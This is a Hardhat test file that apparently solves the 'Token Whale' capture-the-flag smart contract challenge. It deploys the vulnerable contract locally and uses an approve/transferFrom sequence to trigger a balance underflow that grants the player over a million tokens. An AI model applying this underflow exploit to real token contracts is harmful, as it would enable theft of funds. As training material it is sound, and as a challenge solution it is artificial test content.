const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Token Whale Sale Contract', function () {

    let deployer, player,attacker,tokenHolder;
    let baseContract;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, player, attacker,tokenHolder] = await ethers.getSigners();
        const baseContractFactory = await ethers.getContractFactory('TokenWhaleChallenge', deployer);
        baseContract = await baseContractFactory.deploy(player.address);
        await baseContract.deployed();
        expect(
            await baseContract.isComplete()
        ).to.equal(false);
    });

    it('Exploit Token Whale Sales Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await baseContract.connect(player).approve(attacker.address, 250);
        await baseContract.connect(attacker).transferFrom(player.address,tokenHolder.address, 250);
        await baseContract.connect(attacker).transfer(player.address,1000000);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await baseContract.isComplete()
        ).to.be.equal(true);


    });
});